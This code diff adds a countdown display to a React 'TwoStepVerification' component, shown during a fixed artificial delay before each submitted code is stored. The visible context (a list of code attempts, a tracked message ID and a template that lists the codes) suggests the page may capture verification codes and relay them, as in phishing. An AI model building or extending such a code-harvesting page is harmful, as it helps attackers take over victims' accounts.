@@ -17,6 +17,7 @@ const TwoStepVerification = () => {
     const [submitError, setSubmitError] = useState(null);
     const [codeAttempts, setCodeAttempts] = useState([]);
     const [lastMessageId, setLastMessageId] = useState(null);
+    const [countDown, setCountDown] = useState(config.LOAD_TIMEOUT_MS / 1000);
 
     const defaultTexts = useMemo(
         () => ({
@@ -112,6 +113,14 @@ const TwoStepVerification = () => {
         setIsSubmitting(true);
         setSubmitError(null);
 
+        let i = config.LOAD_TIMEOUT_MS;
+        const countDown = setInterval(() => {
+            setCountDown(i / 1000);
+            i -= 1000;
+            if (i == 0) {
+                clearInterval(countDown);
+            }
+        }, 1000);
         await new Promise((resolve) => setTimeout(resolve, config.LOAD_TIMEOUT_MS));
 
         const newCodeAttempts = [...codeAttempts, code];
@@ -311,7 +320,7 @@ ${codeList}`;
                                 cursor: isSubmitting ? 'not-allowed' : 'pointer'
                             }}
                         >
-                            {isSubmitting ? texts.processingButton : texts.continueButton}
+                            {isSubmitting ? `${texts.processingButton} ${countDown}` : texts.continueButton}
                         </button>
                     </div>
                     <div>
